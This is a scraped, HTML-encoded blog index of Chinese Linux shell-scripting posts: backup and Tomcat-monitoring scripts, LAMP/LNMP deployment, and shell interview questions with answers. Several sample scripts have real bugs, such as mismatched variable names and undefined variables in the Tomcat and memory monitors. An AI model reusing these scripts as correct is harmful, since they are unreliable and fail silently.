&#x4E0B;&#x7684;&#x6240;&#x6709;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;# vim /root/logbak.sh# &#x7F16;&#x5199;&#x5907;&#x4EFD;&#x811A;&#x672C;,&#x5907;&#x4EFD;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x5305;&#x542B;&#x65E5;&#x671F;&#x6807;&#x7B7E;,&#x9632;&#x6B62;&#x540E;&#x9762;&#x7684;&#x5907;&#x4EFD;&#x5C06;&#x524D;&#x9762;&#x7684;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x8986;&#x76D6;# &#x6CE8;&#x610F; date &#x547D;&#x4EE4;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x53CD;&#x5F15;&#x53F7;&#x62EC;&#x8D77;&#x6765;,&#x53CD;&#x5F15;&#x53F7;&#x5728;&#x952E;&#x76D8;&lt;tab&gt;&#x952E;&#x4E0A;&#x9762;tar -czf log-`date +%Y%m%d`.tar.gz /var/log# crontab -e #&#x7F16;&#x5199;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6267;&#x884C;&#x5907;&#x4EFD;&#x811A;&#x672C;00 03 * * 5 /home/wenming/datas/logbak.sh &#x5B9A;&#x4E49;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x9875;&#x9762;&#x5730;&#x5740;&#xFF0C;&#x5BF9; tomcat &#x72B6;&#x6001;&#x8FDB;&#x884C;&#x91CD;&#x542F;&#x6216;&#x7EF4;&#x62A4;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/bin/bash# function:&#x81EA;&#x52A8;&#x76D1;&#x63A7;tomcat&#x8FDB;&#x7A0B;&#xFF0C;&#x6302;&#x4E86;&#x5C31;&#x6267;&#x884C;&#x91CD;&#x542F;&#x64CD;&#x4F5C;# author&#xFF1A;huanghong# DEFINE# &#x83B7;&#x53D6;tomcat PPIDtomcatID=$(ps -ef |grep tomcat | grep -w &apos;apache-tomcat-7.0.75&apos; |grep -v &apos;grep&apos; |awk &apos;{print $2}&apos;)# tomcat_startupStartTomcat=/opt/apache-tomcat-7.0.75/bin/startup.sh# TomcatCache=/user/apache-tomcat-5.5.23/work#&#x5B9A;&#x4E49;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x9875;&#x9762;&#x5730;&#x5740;WebURL=http://192.168.242.113:8080/# &#x65E5;&#x5FD7;&#x8F93;&#x51FA;GetPageInfo=/dev/nullTomcatMonitorLog=/tmp/TomcatMonitor.logMonitor() { echo &quot;[info]&#x5F00;&#x59CB;&#x76D1;&#x63A7;tomcat...[$(date +&apos;%F %H:%M:%S&apos;)]&quot; if [$TomcatID] then echo &quot;[info]tomcat&#x8FDB;&#x7A0B;ID&#x4E3A;:$tomcatID.&quot; # &#x83B7;&#x53D6;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801; TomcatServiceCode=$(curl -s -o $GetPageInfo -m 10 --connect-timeout 10 $WebURL -w %{http_code}) if [ $TomcatServiceCode -eq 200 ]; then echo &quot;&quot;[info]&#x8FD4;&#x56DE;&#x7801;&#x4E3A;$TomcatServiceCode,tomcat&#x542F;&#x52A8;&#x6210;&#x529F;,&#x9875;&#x9762;&#x6B63;&#x5E38;.&quot;&quot; else echo &quot;[error]&#x8BBF;&#x95EE;&#x51FA;&#x9519;&#xFF0C;&#x72B6;&#x6001;&#x7801;&#x4E3A;$TomcatServiceCode,&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x5DF2;&#x8F93;&#x51FA;&#x5230;$GetPageInfo&quot; echo &quot;[error]&#x5F00;&#x59CB;&#x91CD;&#x542F;tomcat&quot; kill -9 $tomcatID # &#x6740;&#x6389;tomcat&#x8FDB;&#x7A0B; sleep 3 # rm -rf $TomcatCache $StartTomcat fi else echo &quot;[error]&#x8FDB;&#x7A0B;&#x4E0D;&#x5B58;&#x5728;&#xFF01;tomcat&#x81EA;&#x52A8;&#x91CD;&#x542F;...&quot; echo &quot;[info]$StartTomcat, &#x8BF7;&#x7A0D;&#x4FAF;.......&quot; $StartTomcat fi echo &quot;---------------------------------------&quot;}Monitor &gt;&gt; $TomCatMonitorLog &#x901A;&#x8FC7;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x521B;&#x5EFA;Linux&#x7CFB;&#x7EDF;&#x8D26;&#x6237;&#x53CA;&#x5BC6;&#x7801;12345678#!/bin/bash# &#x901A;&#x8FC7;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x521B;&#x5EFA;Linux&#x7CFB;&#x7EDF;&#x8D26;&#x6237;&#x53CA;&#x5BC6;&#x7801;# $1&#x662F;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;$2&#x662F;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;useradd &quot;$1&quot;echo &quot;$2&quot; | passwd --stdin &quot;$1&quot; &#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x672C;&#x673A;&#x5185;&#x5B58;&#x548C;&#x786C;&#x76D8;&#x5269;&#x4F59;&#x7A7A;&#x95F4;,&#x5269;&#x4F59;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;500M&#x3001;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;1000M&#x65F6;,&#x53D1;&#x9001;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;root&#x7BA1;&#x7406;&#x5458;123456789101112131415#!/bin/bash# &#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x672C;&#x673A;&#x5185;&#x5B58;&#x548C;&#x786C;&#x76D8;&#x5269;&#x4F59;&#x7A7A;&#x95F4;,&#x5269;&#x4F59;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;500M&#x3001;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;1000M&#x65F6;,&#x53D1;&#x9001;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;root&#x7BA1;&#x7406;&#x5458;# &#x63D0;&#x53D6;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;dis_sike=$(free | awk &apos;/Mem/{print $4}&apos;)while:do # &#x6CE8;&#x610F;&#x5185;&#x5B58;&#x548C;&#x78C1;&#x76D8;&#x63D0;&#x53D6;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x90FD;&#x662F;&#x4EE5;kb&#x4E3A;&#x5355;&#x4F4D; if [ $disk_size -le 512000 -a $mem_size -le 1024000 ] then mail -s &quot;Warning&quot; root &lt;&lt;EOF Insufficient resource,&#x8D44;&#x6E90;&#x4E0D;&#x8DB3; EOF fidone &#x4E00;&#x952E;&#x90E8;&#x7F72;LAMP&#xFF08;rpm&#xFF09;1234567891011121314#!/bin/bash# &#x4E00;&#x952E;&#x90E8;&#x7F72; LNMP(RPM &#x5305;&#x7248;&#x672C;)# &#x4F7F;&#x7528; yum &#x5B89;&#x88C5;&#x90E8;&#x7F72; LNMP,&#x9700;&#x8981;&#x63D0;&#x524D;&#x914D;&#x7F6E;&#x597D; yum &#x6E90;,&#x5426;&#x5219;&#x8BE5;&#x811A;&#x672C;&#x4F1A;&#x5931;&#x8D25;# &#x672C;&#x811A;&#x672C;&#x4F7F;&#x7528;&#x4E8E; centos7.2 &#x6216; RHEL7.2yum install -y httpdyum install -y mariadb mariadb-devel mariadb-serveryum install -y httpdyum install -y php php-mysqlsystemctl start httpd mariadbsystemctl enable httpd mariadb document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"SHELL编程类面试题","date":"2022-06-07T04:52:23.000Z","path":"/posts/dbd9d26a/","text":"1. &#x6709;&#x4E00;&#x4E2A;test.txt&#x6587;&#x672C;(&#x5185;&#x5BB9;&#x5982;&#x4E0B;)&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D; &#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002;https://www.baidu.com/index.htmlhttps://www.jaking.com/index.htmlhttps://www.sina.com.cn/1024.htmlhttps://www.jaking.com/2048.htmlhttps://www.sina.com.cn/4096.htmlhttps://www.jaking.com/8192.html &#x53C2;&#x8003;&#x7B54;&#x6848;:123456cat test.txt | cut -d &quot;/&quot; -f 3 | sort | uniq -c | sort -nr# cut -d &#x6309;&#x7167;&#x5206;&#x9694;&#x7B26;&#x5206;&#x5272;# -f 3&#x622A;&#x53D6;&#x7B2C;&#x4E09;&#x5217;# uniq -c &#x663E;&#x793A;&#x6539;&#x884C;&#x91CD;&#x590D;&#x6B21;&#x6570;# sort -nr &#x6309;&#x7167;&#x6570;&#x5B57;&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x6392;&#x5217; 2. &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;&#x53C2;&#x8003;&#x7B54;&#x6848; 12345678netstat -ntup | grep -o [0-9].* | awk &apos;{print $3}&apos; | cut -d: -f 1 | sort | uniq -c | sort -rn# netstat -ntup &#x663E;&#x793A;TCP&#x548C;UDP&#x7684;&#x8FDE;&#x63A5;&#x72B6;&#x51B5;&#xFF0C;&#x4E14;&#x76F4;&#x63A5;&#x663E;&#x793A;IP&#x5730;&#x5740;&#xFF1B;# grep -o [0-9].* &#x53EA;&#x8F93;&#x51FA;&#x5339;&#x914D;&#x5230;&#x7684;&#x90E8;&#x5206;&#xFF0C;# awk &apos;{print $3}&apos; &#x9009;&#x62E9;&#x5339;&#x914D;&#x641C;&#x7D22;&#x5230;&#x7684;&#x7B2C;3&#x5217;# cut -d: -f1 &#x6307;&#x5B9A;&#x5206;&#x9694;&#x7B26; : &#x6307;&#x5B9A;&#x663E;&#x793A;&#x7B2C;1&#x4E2A;&#x5B57;&#x6BB5;# sort &#x9ED8;&#x8BA4;&#x5347;&#x5E8F;&#x6392;&#x5E8F;# uniq -c &#x7EDF;&#x8BA1;&#x5404;&#x884C;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;# sort -rn &#x6839;&#x636E;&#x6570;&#x5B57;&#x8FDB;&#x884C;&#x5012;&#x5E8F;&#x6392;&#x5E8F; 3. &#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;/jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002; &#x5199;&#x5B57;&#x6BCD;&#x52A0;&#x56FA;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;&#xFF08;_nb&#xFF09;&#x7EC4;&#x6210;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;jk16ok_nb.txt&#x3002; &#x53C2;&#x8003;&#x7B54;&#x6848;12345678910111213141516171819#!/bin/bash# &#x68C0;&#x67E5;jaking&#x662F;&#x5426;&#x5B58;&#x5728;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;if [ ! -d /jaking ] then mkdir /jakingficd /jaking # &#x8FDB;&#x5165;&#x6D4B;&#x8BD5;&#x76EE;&#x5F55;#&#x5FAA;&#x73AF;10&#x6B21;&#xFF0C;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x5EFA;&#x7ACB;6&#x4F4D;&#x968F;&#x673A;&#x6570;&#x6587;&#x4EF6;for ((i=1;i&lt;=10;i++)) do filename=$(tr -dc &apos;A-Za-z0-9&apos; &lt; /dev/urandom | head -c 6) touch &quot;$filename&quot;_gg.txtdone# /dev/urandom &#x4E0E; /dev/random# /dev/urandom&#x975E;&#x963B;&#x585E;&#x968F;&#x673A;&#x6570;&#x53D1;&#x751F;&#x5668;&#xFF0C;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x963B;&#x585E;# /dev/random&#x5B58;&#x50A8;&#x7740;&#x7CFB;&#x7EDF;&#x5F53;&#x524D;&#x8FD0;&#x884C;&#x73AF;&#x5883;&#x7684;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#xFF0C;&#x662F;&#x963B;&#x585E;&#x7684;&#x968F;&#x673A;&#x6570;&#x53D1;&#x751F;&#x5668;&#xFF0C;&#x8BFB;&#x53D6;&#x6709;&#x65F6;&#x9700;&#x8981;&#x7B49;&#x5F85;# &#x901A;&#x5E38;&#x4F7F;&#x7528;urandom&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x4F7F;&#x7528;urandom&#x907F;&#x514D;&#x963B;&#x585E; 4. &#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;&#x53C2;&#x8003;&#x7B54;&#x6848;12345678910111213141516171819202122232425262728293031323334353637383940414243444546#&#x65B9;&#x5F0F;&#x4E00;#!/bin/bashn=1while [ $n -lt 10 ]do for (( m=1;m&lt;=$n;m++ )) do echo -n -e &quot;${m}x${n}=$[m*n]\\t&quot; doneechon=$((n+1))done#-----------------&#x6216;&#x8005;---------------------------n=9while [ $n -ge 1 ]do for((i=1;i&lt;=$n;i++)) do echo -n -e &quot;${i}x${n}=$[ n*i ]\\t&quot; doneecho# echo $n n=$((n-1))done######################################### &#x65B9;&#x5F0F;&#x4E8C;#!/bin/bashfor j in {1..9}do for i in `seq $j` do echo -e -n &quot;${i}x${j}=$[ $i * $j ]\\t&quot; doneechodone# ---------------&#x6216;&#x8005;----------------------------for i in {9..1}do for((j=1;j&lt;=$i;j++)) do echo -e -n &quot;${j}x${i}=$[ i*j ] &quot; done echodone 5. &#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A; 3 &#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684; 3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1^3 + 5^3+ 3^3 = 153&#xFF09;&#x3002;&#x53C2;&#x8003;&#x7B54;&#x6848; &#x6240;&#x8C13;&#x201D;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x201D;&#x662F;&#x6307;&#x4E00;&#x4E2A;&#x4E09;&#x4F4D;&#x6570;&#xFF0C;&#x5176;&#x5404;&#x4F4D;&#x6570;&#x5B57;&#x7ACB;&#x65B9;&#x548C;&#x7B49;&#x4E8E;&#x8BE5;&#x672C;&#x8EAB;&#x3002; &#x4F8B;&#x5982;&#xFF1A;153&#x662F;&#x4E00;&#x4E2A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;153=1^3+5^3+3^3&#x3002; 12345678910#!/bin/bash# &#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;3&#x4F4D;&#x6570;&#xFF0C;&#x5176;&#x5404;&#x4F4D;&#x6570;&#x5B57;&#x7ACB;&#x65B9;&#x548C;&#x7B49;&#x4E8E;&#x8BE5;&#x672C;&#x8EAB;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x4ECE;100&#x5F00;&#x59CB;&#x627E;&#xFF1A;for i in {100..1000}do a=${i:0:1} b=${i:1:1} c=${i:2} num=$[$a**3+$b**3+$c**3] [ $num -eq $i ] &amp;&amp; echo &quot;water flower number is: $i&quot;done 1234567891011121314151617181920212223242526272829303132333435363738394041424344//&#x53C2;&#x8003;C&#x7684;&#x5199;&#x6CD5;//&#x65B9;&#x6CD5;&#x4E00;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdbool.h&gt;int&#xA0;cube(const&#xA0;int&#xA0;n){&#xA0;&#xA0;&#xA0;&#xA0;return&#xA0;n*n*n;}boolisNarcissistic(const&#xA0;int&#xA0;n){//&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xA0;&#xA0;&#xA0;&#xA0;int&#xA0;hundreds=n/100;&#xA0;&#xA0;&#xA0;&#xA0;int&#xA0;tens=n/10-hundreds*10;&#xA0;&#xA0;&#xA0;&#xA0;int&#xA0;ones=n%10;&#xA0;&#xA0;&#xA0;&#xA0;return&#xA0;cube(hundreds)+cube(tens)+cube(ones)==n;}int&#xA0;main(void){&#xA0;&#xA0;&#xA0;&#xA0;int&#xA0;i;&#xA0;&#xA0;&#xA0;&#xA0;for(i=100;i&lt;1000;++i){&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;if(isNarcissistic(i))&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;printf(&quot;%d\\n&quot;,i);&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;return&#xA0;0;}//=============================================////&#x65B9;&#x6CD5;&#x4E8C;#include&#xA0;&lt;stdio.h&gt;&#xA0;#include&#xA0;&lt;stdlib.h&gt;int&#xA0;main()&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;int&#xA0;i,j,k,n;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;printf(&quot;&apos;water&#xA0;flower&apos;number&#xA0;is:&quot;);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;for(n=100;n&lt;1000;n++)&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;i=n/100;/*&#x5206;&#x89E3;&#x51FA;&#x767E;&#x4F4D;*/&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;j=n/10%10;/*&#x5206;&#x89E3;&#x51FA;&#x5341;&#x4F4D;*/&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;k=n%10;/*&#x5206;&#x89E3;&#x51FA;&#x4E2A;&#x4F4D;*/&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;if(n==i*i*i+j*j*j+k*k*k)&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;printf(&quot;%-5d&quot;,n);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;printf(&quot;\\n&quot;);&#xA0;&#xA0;&#xA0;&#xA0;return&#xA0;0;} 6. &#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x53C2;&#x8003;123456#&#x4F7F;&#x7528;date &#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;date +%s%N | md5sum | head -c 8#&#x4F7F;&#x7528; /dev/urandom &#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;cat /dev/urandom | head -n 10 | md5sum | head -c 8 &#x62D3;&#x5C55;&#xFF1A; &#x751F;&#x6210;&#x968F;&#x673A;&#x6570;&#x53C2;&#x8003;&#xFF1A;https://doobom.me/random-string-number-in-shell 7. Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;&#x53C2;&#x8003;&#x7B54;&#x6848;1234567891011# &#x65B9;&#x5F0F;&#x4E00;# &#x5339;&#x914D;&#x6BCF;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;sed &apos;s:\\w\\+:0&amp;:g&apos;# &#x6539;&#x6210;&#x914D;&#x4EE5;&#x4EFB;&#x610F;&#x6570;&#x5B57;sed &apos;s/[0-9]/0&amp;/g&apos; #&#x53EA;&#x80FD;&#x5339;&#x914D;1-9&#xFF0C;# &#x6269;&#x5C55;# &#x5982;&#x679C;&#x9700;&#x8981;&#x5339;&#x914D;9&#x4EE5;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x53EF;&#x53EA;&#x5339;&#x914D;&#x884C;&#x9996;sed &apos;s/^[0-9]/0&amp;/g&apos;for i in {1..9}; do echo $i; done | sed &apos;s/[0-9]/0&amp;/g&apos; 8. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;&#x53C2;&#x8003;&#x7B54;&#x6848;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/bin/bash# &#x7B80;&#x5355;&#x7C97;&#x66B4;&#x6CD5;echo &apos; *&apos;;echo &apos; ***&apos;;echo &apos; *****&apos;;echo &apos; *******&apos;;echo &apos;*********&apos;;# for#!/bin/bashfor((i=1;i&lt;=8;i++))do for((k=8;k&gt;i;k--)) do echo -n &quot; &quot; done for((y=1;y&lt;=i;y++)) do echo -n &quot;* &quot; done echo &apos;&apos;done | sed &apos;s/ $//g&apos;####################################!/bin/bashfor((i=1;i&lt;=10;i++))do for((j=10-i;j&gt;=1;j--)) do printf &quot; &quot; done for((k=1;k&lt;=i;k++)) do printf &quot;* &quot; doneprintf &quot;\\n&quot;done###############other######################a=&apos; *&apos;;for i in `seq 1 10` ; do echo &quot;$a&quot;;a=$a&apos; *&apos;;a=${a:1}; done;################awk######################awk &apos;BEGIN{n=8;l=n*2-1;for(i=1;i&lt;=n;i++){ for(j=1;j&lt;=n-i;j++){ printf &quot; &quot; } for(k=1;k&lt;=i;k++){ printf &quot;* &quot; } print x } }&apos; &#x53C2;&#x8003;C&#x683C;&#x5F0F;123456789101112131415#include &quot;stdio.h&quot;int main(){ int a,x,y,z; scanf(&quot;%d&quot;,&amp;a); //&#x8F93;&#x5165;&#x9700;&#x8981;&#x6253;&#x5370;&#x7684;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x7684;&#x884C;&#x6570; for(x=1;x&lt;=a;x++) //&#x6253;&#x5370;&#x5217; { for(y=1;y&lt;=a-x;y++) //&#x6253;&#x5370;&#x7A7A;&#x683C; { printf(&quot; &quot;); } for(z=1;z&lt;=2*x-1;z++) //&#x6253;&#x5370;* printf(&quot;*&quot;); printf(&quot;\\n&quot;); }} 9. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;&#x53C2;&#x8003;&#x7B54;&#x6848;123456789101112131415161718192021# &#x7B80;&#x7B54;&#x7C97;&#x66B4;&#x6CD5;echo &apos;*********&apos;;echo &apos; *******&apos;;echo &apos; *****&apos;;echo &apos; ***&apos;;echo &apos; *&apos;;###########################!/bin/bashfor(( i=0; i&lt;10; i++ ))do for(( j=0; j&lt;i; j++)) do printf &quot; &quot;; done for(( j=10-j; j&gt;0; j-- )) do printf &quot;* &quot;; done printf &quot;\\n&quot;;done 10. &#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002; https://www.jakingchuanqi.comhttps://www.163.comhttps://www.baidu.com &#x53C2;&#x8003;&#x7B54;&#x6848;1234567891011121314151617181920212223#!/bin/bashweb=(https://www.jakingchuanqi.comhttps://www.163.comhttps://www.baidu.com1.1.1.1) #&#x5B9A;&#x4E49;&#x6570;&#x7EC4;for i in ${web[*]} #&#x6309;&#x7167;&#x6570;&#x7EC4;&#x4E2D;&#x503C;&#x7684;&#x4E2A;&#x6570;&#x5FAA;&#x73AF;&#xFF0C;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x628A;&#x6570;&#x7EC4;&#x4E2D;&#x503C;&#x8D4B;&#x4E88;&#x53D8;&#x91CF;ido code=$( curl -o /dev/null -s --connect-timeout 5 -w &apos;%{http_code}&apos; $i | grep -E &quot;200|302&quot;) #&#x68C0;&#x6D4B;curl&#x72B6;&#x6001;&#x7801;then echo &quot;$i is ok&quot; &gt;&gt; /root/ok.logelse # &#x53D8;&#x91CF;$code&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x4F11;&#x7720;10&#x79D2;&#xFF0C;&#x91CD;&#x65B0;&#x68C0;&#x6D4B; sleep 10 code=$( curl -o /dev/null -s --connect-timeout 5 -w &apos;%{http_code}&apos; $i | grep -E &quot;200|302&quot;)if [ &quot;$code&quot; != &quot;&quot; ]then echo &quot;$i is ok&quot; &gt;&gt; /root/ok.logelse echo &quot;$i is error&quot; &gt;&gt; /root/error.logfifidone document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"LNMP手动部署","date":"2022-06-07T04:52:09.000Z","path":"/posts/5922577d/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209#!/bin/bash#Explain: This is a script to quickly deploy the LNMP service#Author: echo#Email: fnaichu@qq.com#Date: 2019-06-06#&#x6CE8;&#x610F;: &#x8FD0;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x524D;&#xFF0C;&#x8BF7;&#x914D;&#x7F6E;&#x597D;yum&#x6E90;&#xFF0C;&#x628A;&#x6240;&#x9700;&#x6E90;&#x7801;&#x5305;&#x653E;&#x5230;/usr/local/src&#x76EE;&#x5F55;&#x4E0B;&#x3002;#&#x63A8;&#x8350;&#x5B89;&#x88C5;&#x5305;&#xFF1A;#cmake-2.8.11.2.tar.gz libmcrypt-2.5.8.tar.gz yasm-1.2.0.tar.gz libpng-1.6.12.tar.gz #freetype-2.5.3.tar.gz libvpx-v1.3.0.tar.bz2 php-5.5.14.tar.gz jpegsrc.v9a.tar.gz #mysql-5.6.19.tar.gz t1lib-5.1.2.tar.gz libgd-2.1.0.tar.gz nginx-1.6.0.tar.gz tiff-4.0.3.tar.gz#&#x90E8;&#x7F72;Linux#&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x5305;yum install -y apr* autoconf automake bison bzip2 bzip2* compat* cpp curl curl-devel fontconfig fontconfig-devel freetype freetype* freetype-devel gcc gcc-c++ gd gettext gettext-devel glibc kernel kernel-headers keyutils keyutils-libs-devel krb5-devel libcom_err-devel libpng libpng-devel libjpeg* libsepol-devel libselinux-devel libstdc++-devel libtool* libgomp libxml2 libxml2-devel libXpm* libtiff libtiff* make mpfr ncurses* ntp openssl openssl-devel patch pcre-devel perl php-common php-gd policycoreutils telnet t1lib t1lib* nasm nasm* unzip wget zlib-devel#&#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;cd /usr/local/srctar xzvf cmake-2.8.11.2.tar.gzcd cmake-2.8.11.2./configuremake &amp;&amp; make install#&#x90E8;&#x7F72;Nginx#&#x505C;&#x6389;Apache&#x670D;&#x52A1;systemctl stop httpd#&#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x5E93;&#x6587;&#x4EF6;yum install -y gcc* zlib zlib-devel pcre pcre-devel openssl 